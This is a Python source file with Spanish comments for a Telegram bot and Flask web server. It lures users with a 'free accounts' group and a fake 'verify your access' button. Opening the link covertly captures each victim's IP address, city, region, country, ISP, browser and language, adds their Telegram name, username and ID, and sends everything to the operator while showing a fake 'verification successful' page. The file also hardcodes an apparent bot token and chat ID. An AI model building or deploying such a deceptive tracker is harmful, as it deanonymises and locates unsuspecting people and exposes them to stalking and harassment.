import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request
import threading
import requests
import time

# --- CONFIGURACIÓN ---
TOKEN_BOT = os.environ.get("TOKEN_BOT", "8759999947:AAFeMtpR6Zs9FaIfVmNTZ4bSB9TBItsrRIo")
TU_CHAT_ID = int(os.environ.get("TU_CHAT_ID", "8542693021"))
APP_URL = os.environ.get("APP_URL", "https://tu-app.up.railway.app") 

bot = telebot.TeleBot(TOKEN_BOT)
app = Flask("mi_bot_de_telegram")

# Creamos una "memoria" para evitar que se repita la info
usuarios_registrados = {}

# =========================================================
# PARTE 1: El servidor web que atrapa la IP, ubicación y usuario
# =========================================================
@app.route('/')
def capturar_ip():
    try:
        # Leemos la IP real
        if request.headers.getlist("X-Forwarded-For"):
            ip_cliente = request.headers.getlist("X-Forwarded-For")[0].split(',')[0]
        else:
            ip_cliente = request.remote_addr

        # Leemos los datos del cliente que escondimos en el enlace
        usuario = request.args.get('usuario', 'Desconocido')
        nombre = request.args.get('nombre', 'Desconocido')
        user_id = request.args.get('user_id', '0')

        # --- EL TRUCO ANTI-REPETICIONES ---
        tiempo_actual = time.time()
        if user_id in usuarios_registrados:
            # Si el cliente ya mandó la info en los últimos 10 minutos (600 seg), no hacemos nada
            if tiempo_actual - usuarios_registrados[user_id] < 600:
                return """
                <body style='background-color:#1a1a1a;color:#28a745;font-family:Arial;text-align:center;padding-top:100px;'>
                    <h1>✅ Verificación exitosa bro!</h1>
                    <p>Ya puedes cerrar esta pestaña y volver a Telegram.</p>
                </body>
                """
        
        # Si pasó más de 10 minutos o es la primera vez, lo registramos en la memoria
        usuarios_registrados[user_id] = tiempo_actual

        user_agent = request.headers.get('User-Agent', 'Desconocido')
        idioma = request.headers.get('Accept-Language', 'Desconocido')[:20]
        
        # Sacamos ubicación por IP
        geo = requests.get(f"http://ip-api.com/json/{ip_cliente}").json()
        pais = geo.get('country', 'Desconocido')
        ciudad = geo.get('city', 'Desconocido')
        region = geo.get('regionName', 'Desconocido')
        proveedor = geo.get('isp', 'Desconocido')
        
        # Te mandamos la info a ti (Admin) CON EL USUARIO INCLUIDO
        mensaje_ip = (
            f"📡 Datos de Red del Cliente 📡\n\n"
            f"👤 Nombre: {nombre}\n"
            f"🔖 Usuario (@): {usuario}\n"
            f"🆔 ID Telegram: {user_id}\n\n"
            f"🌐 IP Pública: {ip_cliente}\n"
            f"🌍 Ubicación: {ciudad}, {region}, {pais}\n"
            f"🏢 Proveedor de Internet: {proveedor}\n"
            f"🗣️ Idioma del Equipo: {idioma}\n"
            f"💻 Navegador/SO: {user_agent}"
        )
        bot.send_message(TU_CHAT_ID, mensaje_ip, parse_mode='Markdown')
    except Exception as e:
        print("Error al obtener datos:", e)
    
    # ESTO ES LO QUE VE EL CLIENTE EN SU PANTALLA AL ABRIR EL ENLACE
    return """
    <body style='background-color:#1a1a1a;color:#28a745;font-family:Arial;text-align:center;padding-top:100px;'>
        <h1>✅ Verificación exitosa bro!</h1>
        <p>Ya puedes cerrar esta pestaña y volver a Telegram.</p>
    </body>
    """

# =========================================================
# PARTE 2: Lo que recibe el cliente cuando da START
# =========================================================
@bot.message_handler(commands=['start'])
def enviar_bienvenida(message):
    nombre = message.from_user.first_name or "bro"
    usuario_tg = f"@{message.from_user.username}" if message.from_user.username else "Sin usuario"
    id_tg = message.from_user.id
    
    # 1. Te manda los datos básicos a ti (Admin)
    texto_admin = (
        f"🚨 Nuevo Cliente dio START 🚨\n\n"
        f"👤 Nombre Real: {nombre}\n"
        f"🔖 Usuario: {usuario_tg}\n"
        f"🆔 ID Telegram: {id_tg}\n"
        f"⏳ *Esperando que el cliente presione el botón...*"
    )
    bot.send_message(TU_CHAT_ID, texto_admin, parse_mode='Markdown')
    
    # 2. Le manda el mensaje y el botón al cliente
    texto_cliente = f"Hola {nombre} bro, bienvenido al grupo de cuentas free 🔥.\n\nPara verificar que eres real y darte acceso, presiona el botón de abajo 👇"
    
    # Creamos el botón y le escondemos los datos del cliente en el enlace
    markup = InlineKeyboardMarkup()
    boton_url = f"{APP_URL}/?usuario={usuario_tg}&nombre={nombre}&user_id={id_tg}"
    markup.add(InlineKeyboardButton("✅ Verificar mi acceso", url=boton_url))
    
    bot.send_message(message.chat.id, texto_cliente, reply_markup=markup)

# =========================================================
# PARTE 3: Encender el servidor y el bot
# =========================================================
def encender_servidor():
    puerto = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=puerto)

print("Bot encendido y servidor listo en Railway...")
threading.Thread(target=encender_servidor).start()
bot.infinity_polling()